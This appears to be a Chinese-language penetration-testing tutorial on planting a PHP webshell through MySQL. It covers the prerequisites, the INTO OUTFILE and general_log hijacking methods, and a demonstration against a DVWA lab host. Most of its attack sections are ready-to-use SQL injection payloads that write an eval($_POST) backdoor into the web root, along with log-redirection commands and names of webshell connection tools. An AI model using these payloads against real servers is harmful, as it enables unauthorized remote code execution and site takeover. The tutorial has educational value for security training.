# webshell写入

## **1必备条件**

想要成功向MySQL写入WebShell需要至少满足以下4个条件：

① 数据库的当前用户为ROOT或拥有FILE权限；  
② 知道网站目录的绝对路径；  
③ PHP的GPC参数为off状态；  
④ MySQL中的secure\_file\_priv参数不能为NULL状态。

注意：关于其中第4点，secure\_file\_priv参数是MySQL用来限制数据导入和导出操作的效果，如果这个参数被设为了一个目录名，那么MySQL会允许仅在这个目录中可以执行文件的导入和导出，例如LOAD DATA、SELECT。。。INTOOUTFILE、LOAD\_FILE\(\)等。如果这个参数为NULL，MySQL会禁止导入导出操作，但是这只是意味着通过outfile方法写入WebShell是无法成功的，但是通过导出日志的方法是可以的。

## **2写入方法**

向MySQL写入WebShell的方式一共有两种，分别是：1、使用outfile方法，2、基于log日志写入法。

Outfile方法其实是Mysql提供的一个用来写入文件的函数，当我们可以控制写入的文件内容以及文件的保存路径时，我们就可以达到传入WebShell的目的。当我们可以使用union查询时，我们构造一个如下语句，就可以达到效果：

Union select “这里是WebShell” into outfile “Web目录”；

当我们无法使用union时，还有一些其他方法也可以实现（利用分隔符写入）：

?id=1 INTO OUTFILE '物理路径' lines terminatedby （这里是WebShell）\#

?id=1 INTO OUTFILE '物理路径' fields terminatedby （这里是WebShell）\#

?id=1 INTO OUTFILE'物理路径'columns terminatedby （这里是WebShell）\#

?id=1 INTO OUTFILE '物理路径' lines startingby （这里是WebShell）\#

基于log日志写入的方法其实是先将日志文件的导出目录修改成Web目录，然后执行了一次简单的WebShell代码查询功能，此时日志文件记录了此过程，这样再Web目录下的日志文件就变成了WebShell。例如，我们先设置日志文件的导出目录：set global general\_file = ‘Web目录’；然后执行一遍：select “WebShell代码”；即可。

## **3使用OUTFILE方法写入Webshell**

### **（1）实验前准备：**

检查secure\_file\_priv是否开启：show variables like‘%secure%’;确认其不为NULL。有值或为空都可以。（若是为NULL，则需要到my.ini文件中手动修改）

![](https://image.3001.net/images/20200810/1597037962.png!small)

检查当前用户是否具备写权限：selectuser,file\_priv from mysql.user;确认其用户的值为Y即代表此用户拥有文件写入权限。

![](https://image.3001.net/images/20200810/1597037979.png!small)

### **（2）确认注入点**

http:/192.168.20.35/DVWA-master/vulnerabilities/sqli/?id=1;

参数ID存在SQL注入漏洞

http:/192.168.20.35/DVWA-master/vulnerabilities/sqli/?id=1’union select version\(\),user\(\) \#

![](https://image.3001.net/images/20200810/1597037995.png!small)

### **（3）利用outfile写入shell文件**

若secure\_file\_priv为空，则可以向任意目录写入文件，若secure\_file\_priv有值，则只能向该值指向的目录写入文件，因为我们的值为空，所以就任意目录写入，但因为还需要工具进行连接，所以最好放在网站的根目录下。

PAYLOAD（使用Union查询注入）：1‘unionselect1,”&lt;?phpeval\(\#\_POST\[‘pass’\]\); ?&gt;” into outfile“F:\\PhpStudy20180211

\\PHPTutorial\\WWW\\Tp.php” \#

PAYLOAD（不用Union）：1’intooutfile“F:\\Php、Study2018021\\PHPTutorial\\WWW\\Tp.php” fields terminated by “&lt;?phpeval\(\#\_POST\[‘pass’\]\); ?&gt;” \#

![](https://image.3001.net/images/20200810/1597038012.png!small)

文件已被写入到网站的根目录下，接下来就可以使用连接工具（蚁剑、菜刀、冰蝎等）进行连接了。

![](https://image.3001.net/images/20200810/1597038052.png!small)

## **4、使用导入日志的方法写入Webshell**

### **（1）实验前准备：**

检查当前mysql下log日志是否开启，以及log的默认地址在哪里：show variables like ‘%general%’;

![](https://image.3001.net/images/20200810/1597038071.png!small)

将log日志开启，并设置日志的写入位置:

Set globalgeneral\_log = on;

Set globalgeneral\_log\_file = ‘F:/test.php’;

![](https://image.3001.net/images/20200810/1597038089.png!small)

### **（2）使用写入日志再读取的方法**

直接在SQL注入点，使用查询语句，添加WebShell代码，如下：

Select '&lt;?phpphpinfo\(\);?&gt;';

此时这段WebShell代码已经被记录到日志文件中了，接下就可以使用连接工具进行连接了。

![](https://image.3001.net/images/20200810/1597038104.png!small)

